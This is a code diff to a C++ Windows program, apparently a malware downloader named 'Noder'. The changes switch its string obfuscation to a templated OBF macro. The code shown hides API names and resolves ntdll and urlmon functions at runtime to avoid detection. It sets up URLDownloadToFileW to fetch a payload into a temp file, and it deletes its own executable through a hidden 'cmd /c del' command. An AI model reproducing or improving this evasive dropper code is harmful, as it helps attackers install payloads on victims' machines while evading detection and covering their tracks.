@@ -27,6 +27,9 @@ Noder::Noder()
 
 Noder::~Noder() 
 {
+	if (this->LdrUnloadDll == NULL)
+		return;
+
 	this->LdrUnloadDll(this->urlmon);
 	this->LdrUnloadDll(this->ntdll);
 }
@@ -57,20 +60,18 @@ void Noder::Init() noexcept
 
 	tempName.append(PAYLOAD_FILE_EXTENSION);
 
-	std::wcout << tempName << std::endl;
-
 	this->destination = tempName;
 }
 
 bool Noder::LoadLibraries() noexcept
 {
-	HMODULE tempNtdll = (HMODULE)GetModuleHandleW(OBFW(L"ntdll.dll"));
+	HMODULE tempNtdll = (HMODULE)GetModuleHandleW(OBF(wchar_t, L"ntdll.dll"));
 
-	f_LdrLoadDll tempLdrLoadDll = (f_LdrLoadDll)GetProcAddress(tempNtdll, OBF("LdrLoadDll"));
-	f_RtlInitUnicodeString tempRtlInitUnicodeString = (f_RtlInitUnicodeString)GetProcAddress(tempNtdll, OBF("RtlInitUnicodeString"));
+	f_LdrLoadDll tempLdrLoadDll = (f_LdrLoadDll)GetProcAddress(tempNtdll, OBF(char, "LdrLoadDll"));
+	f_RtlInitUnicodeString tempRtlInitUnicodeString = (f_RtlInitUnicodeString)GetProcAddress(tempNtdll, OBF(char, "RtlInitUnicodeString"));
 
 	UNICODE_STRING usTemp;
-	tempRtlInitUnicodeString(&usTemp, (PWSTR)OBFW(L"ntdll.dll"));
+	tempRtlInitUnicodeString(&usTemp, (PWSTR)OBF(wchar_t, L"ntdll.dll"));
 	HMODULE hTemp;
 
 	if (tempLdrLoadDll(NULL, 0x0, &usTemp, &hTemp) != 0x0)
@@ -79,7 +80,7 @@ bool Noder::LoadLibraries() noexcept
 	}
 	this->ntdll = hTemp;
 
-	tempRtlInitUnicodeString(&usTemp, (PWSTR)OBFW(L"urlmon.dll"));
+	tempRtlInitUnicodeString(&usTemp, (PWSTR)OBF(wchar_t, L"urlmon.dll"));
 	if (tempLdrLoadDll(NULL, 0x0, &usTemp, &hTemp) != 0x0)
 	{
 		return false;
@@ -91,19 +92,19 @@ bool Noder::LoadLibraries() noexcept
 
 bool Noder::LoadFunctions() noexcept 
 {
-	this->LdrUnloadDll = (f_LdrUnloadDll)GetProcAddress(this->ntdll, OBF("LdrUnloadDll"));
+	this->LdrUnloadDll = (f_LdrUnloadDll)GetProcAddress(this->ntdll, OBF(char, "LdrUnloadDll"));
 	if (this->LdrUnloadDll == NULL)
 		return false;
 
-	this->NtDeleteFile = (f_NtDeleteFile)GetProcAddress(this->ntdll, OBF("NtDeleteFile"));
+	this->NtDeleteFile = (f_NtDeleteFile)GetProcAddress(this->ntdll, OBF(char, "NtDeleteFile"));
 	if (this->NtDeleteFile == NULL)
 		return false;
 
-	this->RtlInitUnicodeString = (f_RtlInitUnicodeString)GetProcAddress(this->ntdll, OBF("RtlInitUnicodeString"));
+	this->RtlInitUnicodeString = (f_RtlInitUnicodeString)GetProcAddress(this->ntdll, OBF(char, "RtlInitUnicodeString"));
 	if (this->RtlInitUnicodeString == NULL)
 		return false;
 
-	this->URLDownloadToFileW = (f_URLDownloadToFileW)GetProcAddress(this->urlmon, OBF("URLDownloadToFileW"));
+	this->URLDownloadToFileW = (f_URLDownloadToFileW)GetProcAddress(this->urlmon, OBF(char, "URLDownloadToFileW"));
 	if (this->URLDownloadToFileW == NULL)
 		return false;
 
@@ -181,12 +182,12 @@ void Noder::CleanUp() noexcept
 		wchar_t pathBuffer[MAX_PATH];
 		GetModuleFileNameW(NULL, pathBuffer, MAX_PATH);
 
-		std::wstring cmd(OBFW(L"/c del "));
+		std::wstring cmd(OBF(wchar_t, L"/c del "));
 		cmd.append(pathBuffer);
-		cmd.append(OBFW(L" >> NUL"));
+		cmd.append(OBF(wchar_t, L" >> NUL"));
 
 		wchar_t file[MAX_PATH];
-		if (!GetEnvironmentVariableW(OBFW(L"ComSpec"), file, MAX_PATH))
+		if (!GetEnvironmentVariableW(OBF(wchar_t, L"ComSpec"), file, MAX_PATH))
 			return;
 
 		ShellExecuteW(0, 0, file, cmd.c_str(), 0, SW_HIDE);
